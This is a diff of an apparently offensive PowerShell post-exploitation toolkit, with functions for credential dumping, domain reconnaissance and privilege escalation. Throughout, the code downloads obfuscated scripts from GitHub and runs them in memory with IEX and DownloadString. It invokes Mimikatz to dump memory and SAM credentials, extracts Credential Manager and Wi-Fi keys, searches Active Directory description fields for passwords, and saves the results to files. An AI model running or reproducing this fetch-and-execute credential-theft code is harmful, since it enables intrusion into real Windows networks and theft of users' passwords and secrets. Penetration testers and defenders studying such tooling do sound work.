@@ -188,8 +188,9 @@ function adidnswildcard
            
 }
 
-function sessionGopher {
-<#
+function sessionGopher 
+{
+    <#
     .DESCRIPTION
         Starts SessionGopher to search for Cached Credentials.
         Author: @securethisshit
@@ -230,8 +231,9 @@ function sessionGopher {
 }
 
 
-function kittielocal {
-<#
+function kittielocal 
+{
+    <#
     .DESCRIPTION
         Dumps Credentials from Memory / SAM Database.
         Author: @securethisshit
@@ -241,9 +243,9 @@ function kittielocal {
     pathcheck
     if (isadmin)
     {
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/kittie.ps1')
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WLAN-Keys.ps1')
-            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
 
             Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
             Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
@@ -252,19 +254,19 @@ function kittielocal {
             if ($output_file -eq "yes" -or $output_file -eq "y" -or $output_file -eq "Yes" -or $output_file -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Dumping Credentials from Memory and SAM Database, because we can:'
-                homegrown >> $currentPath\Exploitation\Credentials.txt
+                Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
                 Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
             }
             else
             {
-            homegrown
+            Invoke-Mimikatz
             Get-WLAN-Keys
             }
     }
     else
     {
         Write-Host -ForegroundColor Yellow 'You need local admin rights for this, only dumping Credential Manager now!'
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
         Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
         Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
     }
@@ -509,6 +511,12 @@ function domainreconmodules
             ringer >> $currentPath\DomainRecon\ForeignUser.txt
             condor >> $currentPath\DomainRecon\ForeignGroup.txt
 	    
+        #Search for AD-Passwords in description fields
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile $currentPath\Microsoft.ActiveDirectory.Management.dll
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
+        thyme >> $currentPath\DomainRecon\Passwords_in_description.txt
+
 	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdev.ps1')
 	    $Date = (Get-Date).AddYears(-1).ToFileTime()
         noshes -RmrzVOkRggEzAyC "(pwdlastset<=$Date)" -wDpWXLYTGZrAWN9 samaccountname,pwdlastset >> $currentPath\DomainRecon\Users_Nochangedpassword.txt
@@ -583,7 +591,7 @@ function privescmodules
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
 
     Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
-    Gorey >> $currentPath\LocalPrivesc\WCMCredentials.txt
+    Invoke-WCMDump >> $currentPath\LocalPrivesc\WCMCredentials.txt
 
     Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'
 
@@ -965,3 +973,4 @@ function WinPwn
     Write-Host -ForegroundColor Yellow 'Didnt get Domadm? Check the found Files/Shares for sensitive Data/Credentials. Check the Property field of AD-Users for Passwords. Network Shares and Passwords in them can lead to success! Try Responder/Inveigh and SMB-Relaying! ADIDNS is a good addition for the whole network. Crack Kerberoasting Hashes.'
     
 }
+
